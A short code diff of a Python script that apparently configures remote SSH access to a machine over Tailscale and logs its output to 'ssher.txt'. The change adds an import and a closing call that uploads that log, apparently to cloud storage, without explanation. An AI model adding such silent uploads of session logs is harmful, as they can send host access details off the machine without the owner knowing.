@@ -16,13 +16,13 @@ This script performs the following actions:
 All terminal output (stdout and stderr) will also be saved to 'ssher.txt'
 in the same directory as this script.
 """
-
 import subprocess
 import os
 import sys
 import json
 import datetime
 from typing import List, Optional
+from upload import upload_to_r2
 
 # --- CONFIGURATION ---
 # IMPORTANT: Replace this with your actual Tailscale authentication key.
@@ -277,7 +277,7 @@ def main():
     except ScriptError:
         print("ssh <any_local_username>@<TAILSCALE_IP_OF_THIS_MACHINE>")
     print("\nRemember that 'any_local_username' must be an actual user account on the destination Linux machine.")
-
+    upload_to_r2(f"ssher.txt")
 
 if __name__ == "__main__":
     main()
